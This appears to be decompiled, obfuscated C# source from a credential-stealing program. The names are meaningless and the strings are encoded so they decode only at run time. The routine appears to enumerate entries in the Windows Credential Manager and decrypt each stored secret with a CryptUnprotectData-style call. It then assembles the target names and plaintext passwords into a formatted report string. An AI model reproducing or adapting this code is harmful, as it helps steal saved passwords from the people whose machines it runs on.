using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using Microsoft.VisualBasic.CompilerServices;

namespace ns1;

internal sealed class Class22
{
	public class Class23
	{
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		public struct Struct9
		{
			public int int_0;

			public IntPtr intptr_0;
		}

		private struct Struct10
		{
			public IntPtr intptr_0;

			public IntPtr intptr_1;

			public IntPtr intptr_2;

			public IntPtr intptr_3;

			public FILETIME filetime_0;

			public IntPtr intptr_4;

			public IntPtr intptr_5;

			public IntPtr intptr_6;

			public IntPtr intptr_7;

			public IntPtr intptr_8;

			public IntPtr intptr_9;

			public IntPtr intptr_10;
		}

		[DebuggerNonUserCode]
		public Class23()
		{
		}

		internal bool method_0(ref Struct9 struct9_0, int int_0, int int_1, int int_2, int int_3, int int_4, ref Struct9 struct9_1)
		{
			return false;
		}

		private bool method_1(string string_0, int int_0, ref int int_1, ref IntPtr intptr_0)
		{
			return false;
		}

		public object method_2()
		{
			string string_ = Class9.smethod_0("KA==", "False");
			int int_ = 0;
			IntPtr intptr_ = IntPtr.Zero;
			IntPtr[] array = null;
			bool flag = method_1(Class9.smethod_0("mMXV0s+4z7PX1qaW1c/NppmRCA==", "False"), 0, ref int_, ref intptr_);
			object result = default(object);
			try
			{
				if (flag)
				{
					array = new IntPtr[int_ - 1 + 1];
					IntPtr intPtr = intptr_;
					int num = int_ - 1;
					for (int i = 0; i <= num; i++)
					{
						ref IntPtr reference = ref array[i];
						reference = Marshal.ReadIntPtr((IntPtr)(intPtr.ToInt32() + IntPtr.Size * i));
						Struct10 @struct = (Struct10)Marshal.PtrToStructure(array[i], typeof(Struct10));
						Struct9 struct9_ = default(Struct9);
						Struct9 struct9_2 = default(Struct9);
						struct9_.intptr_0 = @struct.intptr_5;
						struct9_.int_0 = (int)@struct.intptr_4;
						method_0(ref struct9_, 0, 0, 0, 0, 1, ref struct9_2);
						string_ = Class9.smethod_0("WnWAh3ladYCHeVp1gIeJcIaAh3ladYCHeVp1gId5WnUr", "False") + "\r\n\r\n" + Class9.smethod_0("ebKvw7GFrK+LYyI=", "False") + Marshal.PtrToStringAuto(@struct.intptr_10) + "\r\n" + Class9.smethod_0("gKzJ0MafvbqXbxY=", "False") + Marshal.PtrToStringAuto(struct9_.intptr_0) + "\r\n\r\n" + Class9.smethod_0("cYyXnpBxjJeekHGMl56QcYyXnpBxjJeekHGMl56QcYwU", "False");
					}
					string_0 = string_;
					return result;
				}
				return result;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				string_0 = Class9.smethod_0("KA==", "False");
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	public static string string_0;
}
